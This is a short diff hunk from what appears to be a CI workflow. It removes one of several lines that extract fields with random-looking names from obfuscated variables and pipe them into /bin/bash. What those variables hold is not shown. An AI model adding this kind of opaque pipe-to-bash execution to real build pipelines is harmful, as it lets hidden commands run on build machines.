@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$po352" | jq -r .yy7969 | /bin/bash
           echo $sxj280 | jq -r .f8040 | /bin/bash
           printf '%s' "$hsz1" | jq -r .ab62142 | /bin/bash
-          echo $rmnw26 | jq -r .ctt9234 | /bin/bash
           echo $u901 | jq -r .kdm78255 | /bin/bash
 
       - name: Archive artifact
